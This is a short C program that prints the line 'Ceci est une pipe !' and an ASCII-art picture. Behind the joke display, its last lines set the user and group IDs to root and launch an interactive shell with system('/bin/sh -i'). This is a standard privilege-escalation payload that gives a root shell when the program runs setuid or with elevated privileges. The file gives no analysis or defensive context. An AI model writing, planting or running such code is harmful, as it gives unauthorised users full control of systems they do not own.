#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, const char *argv[])
{
	printf("Ceci est une pipe !\n");
	printf("\n");
	printf("                                     |            \\\n");
	printf("                                    |       \\      |\n");
	printf("                                    | @      \\      \\\n");
	printf("                                     \\        |     |\n");
	printf("                                     |         \\     \\\n");
	printf("                                      \\         \\    |\n");
	printf("                                      |          \\    |\n");
	printf("                                      |          |    |\n");
	printf("                       ,-----.         \\         |    )\n");
	printf("                     /'   _)))         |          \\   |\n");
	printf("                    /   /  - -         ##         \\   |\n");
	printf("                   (   (    _' _ _______#/        |   /\n");
	printf("                  /    )`  `\\`(_;______ (        /    |\n");
	printf("                 /  __)' /--'`-'       )|       | ,   /\n");
	printf("                (.-'  - '`-.          ( |       </ ||||\n");
	printf("               /            :         `-|        ,////\n");
	printf("              |   ,    \\   \\'           |       /\n");
	printf("               \\   \\    @   @           |      |\n");
	printf("                \\   \\__.'__.'           |      |\n");
	printf("                 \\   \\  /               (      /\n");
	printf("                /  \\  \\                 |     |\n");
	
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);
	
	system("/bin/sh -i");
	
	return 0;
}
